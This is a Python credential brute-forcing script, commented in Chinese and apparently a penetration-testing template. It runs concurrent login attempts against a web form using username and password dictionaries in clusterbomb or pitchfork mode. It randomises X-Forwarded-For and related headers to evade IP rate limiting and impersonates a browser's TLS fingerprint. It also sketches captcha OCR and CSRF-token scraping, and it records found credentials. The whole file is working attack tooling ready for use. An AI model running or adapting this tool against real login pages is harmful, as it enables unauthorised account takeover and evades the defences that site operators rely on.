# coding=utf-8

import os, random, threading, time, traceback
from concurrent import futures
from curl_cffi.requests.exceptions import ConnectionError, Timeout
from curl_cffi import requests
from datetime import datetime

#
# =================== [ 全局设置 ] ===================
#

configs = \
{
    # 账户字典
    "account_list": {
        "username": [ "admin" ],
        "password": [ "123456" ]
    },

    # 字典文件
    "account_file": {
        "username": r"", # /path/to/username.txt
        "password": r""  # /path/to/password.txt
    },

    # 爆破模式
    #   pitchfork = 草叉模式（Yakit） / Pitchfork（Burpsuite）
    #   clusterbomb = 乘积模式（Yakit） / ClusterBomb（Burpsuite）
    "mode": "clusterbomb",

    # 超时时间，单位秒
    "timeout": 10,

    # 线程并发数，在涉及到验证码识别的时候不建议使用多线程，线程并发需要设置为1
    "threads": 10,
    
    # 每个线程发起请求后暂停时长，单位秒
    "delay": 1,

    # 密码爆破日志
    "logfile": {
        "found": "found.txt", # 正常的爆破日志
        "exception": "exception.txt", # 发生异常时的日志
    },

    # 是否使用代理
    "use_proxy": False,

    # 设置代理
    "proxies": {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    },

    # 自定义headers
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Connection": "close",
    },

    # 自定义cookies
    "cookies": {
        # "JSESSIONID": ""
    }
}

# 日志输出互斥锁
message_output_locks = {
    "found": threading.Lock(),
    "exception": threading.Lock()
}

# 多线程信号控制
concurrent_control_signals = \
{
    # 线程池停止启动新线程信号
    "thread_pool_stop_signal": threading.Event(),

    # 进度汇报线程停止信号
    "report_thread_stop_signal": threading.Event(),

    # 总共需要登陆的次数
    "total_login_count": 0,

    # 已完成爆破计数
    "login_finished_count": 0,

    # 已完成爆破计数锁
    "login_finished_count_lock": threading.Lock(),

    # 连续爆破异常计数
    "login_exception_count": 0,

    # 连续爆破异常计数锁
    "login_exception_count_lock": threading.Lock()
}

#
# =================== [ 功能函数 ] ===================
#

# 普通日志输出
def info_message(message: str):
    with message_output_locks["found"]:
        print(message)
        with open(configs["logfile"]["found"], "a", encoding="utf-8") as fout:
            fout.write(message + "\n")

# 异常日志输出
def exception_message(message: str):
    with message_output_locks["exception"]:
        print(message)
        with open(configs["logfile"]["exception"], "a", encoding="utf-8") as fout:
            fout.write(message + "\n")

# deltatime 格式化
def strfdelta(delta, fmt):
    d = dict()
    d["days"] = delta.days
    d["hours"], rem = divmod(delta.seconds, 3600)
    d["minutes"], d["seconds"] = divmod(rem, 60)
    return fmt.format(**d)

#
# =================== [ 加密用例 ] ===================
#

# import crypto 

# password = crypto.DES_encrypt("123456")
# password = crypto.AES_encrypt("123456")
# password = crypto.RSA_encrypt("123456")
# password = crypto.MD5_hash("123456")
# password = crypto.Base64_encode("123456")

#
# =================== [ 验证码识别用例 ] ===================
#

# import captchadet 
# ocr = captchadet.init()
# response = session.get("https://example.com/login/vcode")

## if response.content is bytes image
# captcha = captchadet.identify_image(ocr, response.content)

## if response.text is inline image like data:image/png;base64,iVBOR...
# captcha = captchadet.identify_inline_image(ocr, response.text)

#
# =================== [ 用XPath读取CSRF Token用例 ] ===================
#

# from lxml import etree
# response = session.get("https://example.com/login")
# html = etree.HTML(response.text, etree.HTMLParser())
# csrftoken = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]

#
# =================== [ 用selenium执行JS用例 ] ===================
#

# import execjs

# # 这里需要修改execjs中的功能函数，自行定制所需功能
# signature = execjs.signature("123456")
# print(signature)

#
# =================== [ 爆破函数 ] ===================
#

# 爆破函数
def run(username, password):
    time.sleep(configs["delay"])

    headers = configs["headers"].copy()
    random_ip = ".".join(str(random.randint(0,255)) for _ in range(4))
    headers.update({
        "X-Forwarded-For": random_ip,
        "X-Originating-IP": random_ip,
        "X-Remote-IP": random_ip,
        "X-Remote-Addr": random_ip,
        "X-Real-IP": random_ip
    })
    cookies = configs["cookies"].copy()
    proxies = configs["proxies"] if configs["use_proxy"] else None

    try:
        url = "https://example.com"
        session = requests.Session(impersonate="firefox133")

        # 在某种条件下可以尝试重复请求，如验证码识别错误，服务器响应502等
        error = {}
        error["502"] = 0
        # error["captcha"] = 0
        while True:

            data = {
                "username": username,
                "password": password
            }
            response = session.post(url + "/login.html",
                json=data, cookies=cookies, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=configs["timeout"])

            if response.status_code == 502:
                error["502"] += 1
                if error["502"] > 5:
                    raise Exception("Server internal error")
                continue
            # elif "验证码有误" in response.text:
            #     error["captcha"] += 1
            #     if error["captcha"] > 5:
            #         raise Exception("Incorrect captcha")
            #     continue
            else:
                break

        # 一般情况下可以知道登录失败会返回什么报文，而不知道登录成功会返回什么报文
        # 因此 if 和 elif 里只写登录失败的情况，用 else 来处理登录成功的情况

        # if len(response.content) == 100:
        # if response.status_code == 401:
        # if "Login failed" in response.text:
        # if response.status_code == 302 and "index/login.html" in response.headers['Location']:

        if "用户不存在" in response.text: # 失败的情况1
            # 未发生异常，重置连续异常计数
            with concurrent_control_signals["login_exception_count_lock"]:
                concurrent_control_signals["login_exception_count"] = 0
            return

        elif "密码错误" in response.text: # 失败的情况2
            # 未发生异常，重置连续异常计数
            with concurrent_control_signals["login_exception_count_lock"]:
                concurrent_control_signals["login_exception_count"] = 0
            return

        else:
            # 输出提示找到密码
            info_message(f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
            # 未发生异常，重置连续异常计数
            with concurrent_control_signals["login_exception_count_lock"]:
                concurrent_control_signals["login_exception_count"] = 0
            return

    except (ConnectionError, Timeout) as e:
        exception_message(f"{username}:{password}")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Error: {e}")
        # 异常计数+1
        with concurrent_control_signals["login_exception_count_lock"]:
            concurrent_control_signals["login_exception_count"] += 1
        return

    except Exception as e:
        exception_message(f"{username}:{password}")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Error: {e}, detail:")
        print(traceback.format_exc())
        # 异常计数+1
        with concurrent_control_signals["login_exception_count_lock"]:
            concurrent_control_signals["login_exception_count"] += 1
        return

    finally: # finally 会在 return 之前运行
        # 连续异常10次就退出
        with concurrent_control_signals["login_exception_count_lock"]:
            if concurrent_control_signals["login_exception_count"] > 10:
                print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
                concurrent_control_signals["thread_pool_stop_signal"].set()
        # 完成计数+1
        with concurrent_control_signals["login_finished_count_lock"]:
            concurrent_control_signals["login_finished_count"] += 1

#
# =================== [ 线程池函数 ] ===================
#

# 并发运行爆破函数
def concurrent_run(executor, tasks, usernames, passwords):
    if configs["mode"] == "clusterbomb":
        for password in passwords:
            for username in usernames:
                # 如果队列过长就等待
                if len(tasks) >= configs["threads"]:
                    _, tasks = futures.wait(tasks, return_when=futures.FIRST_COMPLETED)
                # 检查是否需要退出
                if concurrent_control_signals["thread_pool_stop_signal"].is_set():
                    return
                # 新建线程
                tasks.add(executor.submit(run, username, password))
    elif configs["mode"] == "pitchfork":
        count = min(len(usernames), len(passwords))
        for i in range(count):
            # 如果队列过长就等待
            if len(tasks) >= configs["threads"]:
                _, tasks = futures.wait(tasks, return_when=futures.FIRST_COMPLETED)
            # 检查是否需要退出
            if concurrent_control_signals["thread_pool_stop_signal"].is_set():
                return
            # 新建线程
            tasks.add(executor.submit(run, username[i], password[i]))
    else:
        print(f'[x] Unknown mode: {configs["mode"]}')

# 报告进度
def report_elapsed_time():
    # 报告启动时间
    now = datetime.now()
    start_at = now
    print(f"[+] {now.strftime('%H:%M:%S')} task start")
    
    # 每10分钟汇报一次进度
    total = concurrent_control_signals["total_login_count"]
    finished = concurrent_control_signals["login_finished_count"]
    print(f"[!] {now.strftime('%H:%M:%S')} {finished}/{total} ({finished * 100 // total}%) finished")
    while True:
        if True == concurrent_control_signals["report_thread_stop_signal"].wait(timeout=600.0):
            break
        finished = concurrent_control_signals["login_finished_count"]
        print(f"[!] {datetime.now().strftime('%H:%M:%S')} {finished}/{total} ({finished * 100 // total}%) finished")

    # 报告结束时间
    now = datetime.now()
    end_at = now
    elapsed = strfdelta(end_at - start_at, "{days} days {hours}:{minutes}:{seconds}")
    print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")

if __name__ == "__main__":
    # 加载用户名字典
    usernames = configs["account_list"]["username"].copy()
    if configs["account_file"]["username"]:
        try:
            with open(configs["account_file"]["username"], "r", encoding="utf-8") as fin:
                for line in fin:
                    line = line.strip()
                    if not line:
                        continue
                    usernames.append(line)
        except Exception as e:
            print(f'[x] Cannot open \'{configs["account_file"]["username"]}\' username file {e}')
            os._exit(0)
    
    # 加载密码字典
    passwords = configs["account_list"]["password"].copy()
    if configs["account_file"]["password"]:
        try:
            with open(configs["account_file"]["password"], "r", encoding="utf-8") as fin:
                for line in fin:
                    line = line.strip()
                    if not line:
                        continue
                    passwords.append(line)
        except Exception as e:
            print(f'[x] Cannot open \'{configs["account_file"]["password"]}\' password file {e}')
            os._exit(0)

    # 计算总共需要登录的次数
    if configs["mode"] == "clusterbomb":
        concurrent_control_signals["total_login_count"] = len(usernames) * len(passwords)
    elif configs["mode"] == "pitchfork":
        concurrent_control_signals["total_login_count"] = min(len(usernames), len(passwords))
    else:
        print(f'[x] Unknown mode: {configs["mode"]}')
        os._exit(0)
    
    # 检查总共需要登录的次数是否为0
    if concurrent_control_signals["total_login_count"] == 0:
        print("[!] The total number of login attempts required is 0, so the program exits.")
        os._exit(0)

    # 日志记录时间
    info_message(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    exception_message(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    # 启动进度报告线程
    report_thread = threading.Thread(target=report_elapsed_time)
    report_thread.start()

    # 线程池
    tasks = set()
    with futures.ThreadPoolExecutor(max_workers=configs["threads"]) as executor:
        try:
            concurrent_run(executor, tasks, usernames, passwords)
            print("[!] Wait for all threads exit.")
            futures.wait(tasks, return_when=futures.ALL_COMPLETED)
        except KeyboardInterrupt:
            print("[!] Get Ctrl-C, wait for all threads exit.")
            futures.wait(tasks, return_when=futures.ALL_COMPLETED)

    # 等待线程退出
    concurrent_control_signals["report_thread_stop_signal"].set()
    report_thread.join()
